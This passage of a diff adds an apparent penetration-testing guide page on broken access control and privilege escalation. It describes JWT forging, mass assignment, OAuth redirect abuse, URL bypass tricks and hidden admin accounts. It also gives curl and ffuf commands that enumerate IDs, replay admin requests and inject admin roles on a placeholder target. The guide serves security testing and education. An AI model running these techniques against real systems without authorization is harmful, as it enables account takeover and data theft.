+<li>JWT claims: <code>{&quot;role&quot;: &quot;user&quot;}</code> → forge to <code>{&quot;role&quot;: &quot;admin&quot;}</code></li>
+</ul>
+<h3 id="4-mass-assignment--auto-binding">
+  4. Mass Assignment / Auto-Binding
+  <a class="anchor" href="#4-mass-assignment--auto-binding">#</a>
+</h3>
+<p>The application blindly binds client-submitted fields to internal object properties without a whitelist. An attacker injects extra fields to modify properties they shouldn&rsquo;t control.</p>
+<p><strong>How it works:</strong> Registration form sends <code>{name, email, password}</code>. Attacker adds <code>&quot;role&quot;: &quot;admin&quot;</code> or <code>&quot;isVerified&quot;: true</code> to the JSON body. If the server framework auto-maps all incoming fields to the database model, the attacker becomes admin on signup.</p>
+<p><strong>Common injectable fields:</strong></p>
+<ul>
+<li><code>role</code>, <code>isAdmin</code>, <code>isSuperUser</code>, <code>permissions</code></li>
+<li><code>is_verified</code>, <code>email_confirmed</code>, <code>approved</code></li>
+<li><code>balance</code>, <code>credits</code>, <code>plan</code>, <code>subscription_tier</code></li>
+<li><code>org_id</code>, <code>tenant_id</code> (cross-tenant escalation)</li>
+</ul>
+<h3 id="5-jwt--token-manipulation">
+  5. JWT &amp; Token Manipulation
+  <a class="anchor" href="#5-jwt--token-manipulation">#</a>
+</h3>
+<p>Weak JWT implementations allow attackers to forge tokens, escalate claims, or bypass signature verification entirely.</p>
+<p><strong>Attack vectors:</strong></p>
+<ul>
+<li><strong>Algorithm confusion (None attack):</strong> Change <code>&quot;alg&quot;: &quot;HS256&quot;</code> to <code>&quot;alg&quot;: &quot;none&quot;</code> and strip the signature</li>
+<li><strong>Algorithm switching:</strong> Change from RS256 to HS256; use the public key as the HMAC secret</li>
+<li><strong>Weak secrets:</strong> Brute-force HMAC secrets with <code>jwt_tool</code> or <code>hashcat</code></li>
+<li><strong>Claim tampering:</strong> Modify <code>role</code>, <code>sub</code>, <code>admin</code>, <code>scope</code> claims after cracking or bypassing signature</li>
+<li><strong>Missing expiration:</strong> Token never expires; stolen token grants permanent access</li>
+<li><strong>JWK injection:</strong> Embed attacker&rsquo;s public key in the token header via <code>jwk</code> or <code>jku</code></li>
+<li><strong>KID manipulation:</strong> Set <code>kid</code> header to force the server to use a known/predictable key</li>
+</ul>
+<h3 id="6-oauth--sso-privilege-escalation">
+  6. OAuth &amp; SSO Privilege Escalation
+  <a class="anchor" href="#6-oauth--sso-privilege-escalation">#</a>
+</h3>
+<p>Flaws in OAuth flows, SSO integrations, or permission consent screens allow attackers to gain unauthorized access or elevated permissions.</p>
+<p><strong>Attack vectors:</strong></p>
+<ul>
+<li><strong>Consent screen manipulation:</strong> OAuth permissions screen shows incorrect/incomplete scopes; user grants more than intended (e.g., X/xAI HackerOne #434763 — DMs readable without permission)</li>
+<li><strong>Redirect URI manipulation:</strong> Attacker redirects OAuth callback to their server to steal authorization codes</li>
+<li><strong>Scope escalation:</strong> Request broader scopes than the app is authorized for</li>
+<li><strong>SSO email confusion:</strong> Register with an email matching an existing SSO account to hijack it</li>
+<li><strong>GitHub App escalation:</strong> Abuse GitHub app installation permissions to escalate to organization owner (Tanner&rsquo;s $10K bounty)</li>
+<li><strong>Email confirmation bypass:</strong> Skip email verification during SSO-linked registration to take over shop accounts (Shopify HackerOne #791775)</li>
+</ul>
+<h3 id="7-multi-step-process-bypass">
+  7. Multi-Step Process Bypass
+  <a class="anchor" href="#7-multi-step-process-bypass">#</a>
+</h3>
+<p>The application enforces authorization only on early steps of a multi-step workflow but not on the final action. An attacker skips directly to the confirmation step.</p>
+<p><strong>How it works:</strong> Admin function to update user details involves: (1) Load form, (2) Submit changes, (3) Review and confirm. Authorization is checked at steps 1 and 2 but not step 3. Attacker directly sends the step 3 request with required parameters.</p>
+<p><strong>Where to look:</strong></p>
+<ul>
+<li>Payment confirmation endpoints</li>
+<li>Order finalization / checkout completion</li>
+<li>Account deletion confirmation</li>
+<li>Role change approval workflows</li>
+<li>Content publishing / approval actions (e.g., publishing a paid theme without purchasing — Shopify HackerOne #927567)</li>
+</ul>
+<h3 id="8-referer-based-access-control">
+  8. Referer-Based Access Control
+  <a class="anchor" href="#8-referer-based-access-control">#</a>
+</h3>
+<p>The application checks the <code>Referer</code> header to determine whether a request is authorized. Since the Referer header is fully attacker-controllable, this is trivially bypassed.</p>
+<p><strong>How it works:</strong> <code>/admin</code> page has proper auth checks, but sub-pages like <code>/admin/deleteUser</code> only verify that the <code>Referer</code> header contains <code>/admin</code>. Attacker forges the Referer header in a direct request.</p>
+<h3 id="9-url--path-manipulation-bypass">
+  9. URL &amp; Path Manipulation Bypass
+  <a class="anchor" href="#9-url--path-manipulation-bypass">#</a>
+</h3>
+<p>Differences in how the access control layer and the application router interpret URLs create bypass opportunities.</p>
+<p><strong>Bypass techniques:</strong></p>
+<ul>
+<li><strong>Case variation:</strong> <code>/ADMIN/DELETEUSER</code> vs <code>/admin/deleteUser</code></li>
+<li><strong>Trailing slash:</strong> <code>/admin/deleteUser/</code> vs <code>/admin/deleteUser</code></li>
+<li><strong>URL encoding:</strong> <code>/admin%2FdeleteUser</code>, double encoding <code>%252F</code></li>
+<li><strong>Path traversal:</strong> <code>/user/../../admin/deleteUser</code></li>
+<li><strong>Suffix patterns (Spring):</strong> <code>/admin/deleteUser.anything</code> maps to <code>/admin/deleteUser</code></li>
+<li><strong>Header override:</strong> <code>X-Original-URL: /admin/deleteUser</code> or <code>X-Rewrite-URL: /admin/deleteUser</code> — front-end checks <code>/</code> but backend processes the header value</li>
+<li><strong>HTTP method switching:</strong> Access control blocks <code>POST /admin/delete</code> but allows <code>GET /admin/delete</code> or <code>PUT /admin/delete</code></li>
+</ul>
+<h3 id="10-unprotected-functionality--admin-panel-exposure">
+  10. Unprotected Functionality &amp; Admin Panel Exposure
+  <a class="anchor" href="#10-unprotected-functionality--admin-panel-exposure">#</a>
+</h3>
+<p>Administrative or privileged functions exist without any access control, relying entirely on the obscurity of the URL.</p>
+<p><strong>Discovery methods:</strong></p>
+<ul>
+<li><code>robots.txt</code> disclosing admin paths</li>
+<li>JavaScript files containing admin URLs (e.g., <code>adminPanelTag.setAttribute('href', '/administrator-panel-yb556')</code>)</li>
+<li>HTML source comments revealing endpoints</li>
+<li>Wordlist brute-forcing with tools like <code>ffuf</code>, <code>gobuster</code>, <code>dirbuster</code></li>
+<li>API documentation endpoints (<code>/swagger</code>, <code>/api-docs</code>, <code>/graphql</code>)</li>
+<li>Mobile app reverse engineering revealing hidden API routes</li>
+</ul>
+<h3 id="11-graphql-authorization-bypass">
+  11. GraphQL Authorization Bypass
+  <a class="anchor" href="#11-graphql-authorization-bypass">#</a>
+</h3>
+<p>GraphQL APIs are particularly sensitive to privilege escalation because a single endpoint handles all operations, and introspection can reveal the entire schema.</p>
+<p><strong>Attack vectors:</strong></p>
+<ul>
+<li><strong>Introspection enabled:</strong> Query <code>{ __schema { queryType { name } } }</code> to discover all queries, mutations, and types</li>
+<li><strong>Missing field-level authorization:</strong> Mutation accepts <code>role</code>, <code>isAdmin</code>, or other privileged fields</li>
+<li><strong>Nested object access:</strong> Query resolvers that follow relationships without checking authorization at each level</li>
+<li><strong>Batch queries:</strong> Send multiple operations in one request to bypass rate limiting on authorization checks</li>
+<li><strong>Alias-based bypass:</strong> Use aliases to query the same field with different arguments in one request</li>
+</ul>
+<h3 id="12-api-key--token-scope-escalation">
+  12. API Key &amp; Token Scope Escalation
+  <a class="anchor" href="#12-api-key--token-scope-escalation">#</a>
+</h3>
+<p>API keys or tokens with excessive permissions, or APIs that don&rsquo;t validate token scope against the requested action.</p>
+<p><strong>Patterns:</strong></p>
+<ul>
+<li>API key with <code>read+write+admin</code> scope issued for a <code>read-only</code> integration</li>
+<li>Bearer tokens that grant access to all tenants instead of the issuing tenant</li>
+<li>Service account tokens exposed in client-side code or mobile apps</li>
+<li>Tokens that don&rsquo;t expire or can&rsquo;t be revoked</li>
+</ul>
+<h3 id="13-hidden-admin-account--persistence">
+  13. Hidden Admin Account &amp; Persistence
+  <a class="anchor" href="#13-hidden-admin-account--persistence">#</a>
+</h3>
+<p>Attackers with temporary elevated access create hidden backdoor accounts that survive password resets and permission changes.</p>
+<p><strong>Real-world pattern (Reddit HackerOne #1596663):</strong> Admin creates a hidden admin account that the organization owner cannot detect or remove. The hidden account continues to perform administrative actions even after the original admin&rsquo;s access is revoked.</p>
+<h3 id="14-registration--invitation-flow-abuse">
+  14. Registration &amp; Invitation Flow Abuse
+  <a class="anchor" href="#14-registration--invitation-flow-abuse">#</a>
+</h3>
+<p>Flaws in user registration, invitation, and onboarding flows allow privilege escalation during account creation.</p>
+<p><strong>Attack vectors:</strong></p>
+<ul>
+<li><strong>Role parameter injection at registration:</strong> Adding <code>role=admin</code> during signup</li>
+<li><strong>Invitation link hijacking:</strong> Using an invitation link meant for an admin role with a different email</li>
+<li><strong>Email domain spoofing:</strong> Registering with an email that matches the organization&rsquo;s domain to auto-assign elevated roles</li>
+<li><strong>Self-invitation escalation:</strong> Low-privilege user who lacks user management access can still invite other users or remove the business owner (BugBoard reports on restaurant platform)</li>
+</ul>
+<hr>
+<h2 id="attack-surfaces">
+  Attack Surfaces
+  <a class="anchor" href="#attack-surfaces">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Layer</strong></th>
+<th><strong>What to Test</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>API Endpoints</strong></td>
+<td>CRUD operations on all resources; admin/management endpoints; GraphQL queries &amp; mutations</td>
+</tr>
+<tr>
+<td><strong>Object References</strong></td>
+<td>IDs in URLs, query params, body, headers, cookies; file download endpoints</td>
+</tr>
+<tr>
+<td><strong>Session &amp; Token</strong></td>
+<td>JWT claims, cookie values, hidden fields, session identifiers</td>
+</tr>
+<tr>
+<td><strong>Access Control Logic</strong></td>
+<td>Role checks on every endpoint; multi-step workflows; Referer-based controls</td>
+</tr>
+<tr>
+<td><strong>URL Routing</strong></td>
+<td>Case sensitivity, trailing slashes, path traversal, header overrides, HTTP method handling</td>
+</tr>
+<tr>
+<td><strong>OAuth &amp; SSO</strong></td>
+<td>Consent screens, redirect URIs, scope validation, email verification</td>
+</tr>
+<tr>
+<td><strong>Registration &amp; Invitation</strong></td>
+<td>Signup fields, invitation flows, email confirmation, role assignment</td>
+</tr>
+<tr>
+<td><strong>GraphQL</strong></td>
+<td>Introspection, mutations, nested resolvers, field-level authorization</td>
+</tr>
+<tr>
+<td><strong>File &amp; Resource Access</strong></td>
+<td>File download by ID, document sharing links, media access tokens</td>
+</tr>
+<tr>
+<td><strong>Cloud &amp; Infrastructure</strong></td>
+<td>IAM roles, service account permissions, cross-tenant access</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="exploitation-and-testing-techniques">
+  Exploitation and Testing Techniques
+  <a class="anchor" href="#exploitation-and-testing-techniques">#</a>
+</h2>
+<h3 id="1-idor--bola-testing">
+  1. IDOR / BOLA Testing
+  <a class="anchor" href="#1-idor--bola-testing">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether changing an object identifier in any request lets you access another user&rsquo;s data or perform actions on their behalf.</p>
+<p><strong>Manual — Burp Repeater:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Capture</span> <span style="color:#a6e22e">an</span> <span style="color:#a6e22e">authenticated</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">referencing</span> <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">own</span> <span style="color:#a6e22e">resource</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">users</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1234</span><span style="color:#f92672">/</span><span style="color:#a6e22e">profile</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Change</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">another</span> <span style="color:#a6e22e">user</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">users</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1235</span><span style="color:#f92672">/</span><span style="color:#a6e22e">profile</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION</span>
+</span></span></code></pre></div><p><strong>Automated enumeration (curl loop):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">id</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">$</span>(<span style="color:#a6e22e">seq</span> <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">1100</span>); <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#e6db74">&#34;https://target.com/api/orders/$id&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$TOKEN&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">|</span> <span style="color:#a6e22e">jq</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">e</span> <span style="color:#e6db74">&#39;.email&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">echo</span> <span style="color:#e6db74">&#34;IDOR Hit: $id&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">done</span>
+</span></span></code></pre></div><p><strong>Automated enumeration (ffuf):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">ffuf</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">u</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/api/users/FUZZ/profile \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$TOKEN&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">w</span> <span style="color:#f92672">&lt;</span>(<span style="color:#a6e22e">seq</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">5000</span>) <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">mc</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">o</span> <span style="color:#a6e22e">idor_hits</span>.<span style="color:#a6e22e">json</span>
+</span></span></code></pre></div><p><strong>Expected:</strong> Accessing another user&rsquo;s resource should return <code>403 Forbidden</code> or <code>404 Not Found</code>, never a <code>200 OK</code> with their data.</p>
+<p><strong>Tools:</strong> Burp Suite (Authorize extension, Intruder), ffuf, OWASP ZAP (Access Control testing), Auto Repeater.</p>
+<h3 id="2-vertical-privilege-escalation">
+  2. Vertical Privilege Escalation
+  <a class="anchor" href="#2-vertical-privilege-escalation">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether a low-privileged user can access admin-only endpoints and functions.</p>
+<p><strong>Manual — Two-session technique:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Step</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Log</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">admin</span>, <span style="color:#a6e22e">capture</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">admin</span> <span style="color:#66d9ef">function</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">admin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">deleteUser</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SessionID</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ADMIN_SESSION</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;userId&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;victim123&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Step</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Replay</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">same</span> <span style="color:#a6e22e">request</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">regular</span> <span style="color:#a6e22e">user</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">session</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">admin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">deleteUser</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SessionID</span><span style="color:#f92672">=</span><span style="color:#a6e22e">REGULAR_USER_SESSION</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;userId&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;victim123&#34;</span>}
+</span></span></code></pre></div><p><strong>Admin panel discovery:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">robots</span>.<span style="color:#a6e22e">txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/robots.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">JavaScript</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">admin</span> <span style="color:#a6e22e">URLs</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/ | grep -oP &#39;(?:href|src|url)[\s]*[=:]\s*[&#34;\x27]([^&#34;\x27]*admin[^&#34;\x27]*)[&#34;\x27]&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Brute</span><span style="color:#f92672">-</span><span style="color:#a6e22e">force</span> <span style="color:#a6e22e">admin</span> <span style="color:#a6e22e">paths</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ffuf</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">u</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403
+</span></span></span></code></pre></div><p><strong>Expected:</strong> Admin endpoints should return <code>401</code> or <code>403</code> for non-admin users. A <code>200</code> or <code>302</code> to the admin page content indicates a vulnerability.</p>
+<h3 id="3-parameter-manipulation">
+  3. Parameter Manipulation
+  <a class="anchor" href="#3-parameter-manipulation">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether modifying hidden fields, cookies, or query parameters changes the user&rsquo;s effective role.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">cookie</span><span style="color:#f92672">-</span><span style="color:#a6e22e">based</span> <span style="color:#a6e22e">role</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/dashboard \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=abc123; role=admin&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">query</span> <span style="color:#a6e22e">parameter</span> <span style="color:#a6e22e">role</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#e6db74">&#34;https://target.com/home?admin=true&amp;role=1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">hidden</span> <span style="color:#a6e22e">field</span> <span style="color:#a6e22e">manipulation</span> (<span style="color:#a6e22e">intercept</span> <span style="color:#a6e22e">POST</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">Burp</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">profile</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">form</span><span style="color:#f92672">-</span><span style="color:#a6e22e">urlencoded</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">username</span><span style="color:#f92672">=</span><span style="color:#a6e22e">attacker</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">profile</span><span style="color:#f92672">=</span><span style="color:#a6e22e">SysAdmin</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">isAdmin</span><span style="color:#f92672">=</span><span style="color:#66d9ef">true</span>
+</span></span></code></pre></div><h3 id="4-mass-assignment-testing">
+  4. Mass Assignment Testing
+  <a class="anchor" href="#4-mass-assignment-testing">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether the API accepts and processes fields that should not be user-controllable.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Normal</span> <span style="color:#a6e22e">registration</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/api/register \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;{&#34;name&#34;:&#34;test&#34;,&#34;email&#34;:&#34;test@test.com&#34;,&#34;password&#34;:&#34;Pass123!&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Mass</span> <span style="color:#a6e22e">assignment</span> <span style="color:#a6e22e">attempt</span> <span style="color:#960050;background-color:#1e0010">—</span> <span style="color:#a6e22e">inject</span> <span style="color:#a6e22e">role</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/api/register \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;{&#34;name&#34;:&#34;test&#34;,&#34;email&#34;:&#34;test@test.com&#34;,&#34;password&#34;:&#34;Pass123!&#34;,&#34;role&#34;:&#34;admin&#34;,&#34;isVerified&#34;:true}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Mass</span> <span style="color:#a6e22e">assignment</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">profile</span> <span style="color:#a6e22e">update</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">PATCH</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/api/users/me \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Authorization: Bearer $TOKEN&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;{&#34;name&#34;:&#34;test&#34;,&#34;role&#34;:&#34;admin&#34;,&#34;permissions&#34;:[&#34;read&#34;,&#34;write&#34;,&#34;delete&#34;,&#34;admin&#34;]}&#39;</span>
+</span></span></code></pre></div><p><strong>GraphQL mass assignment:</strong></p>
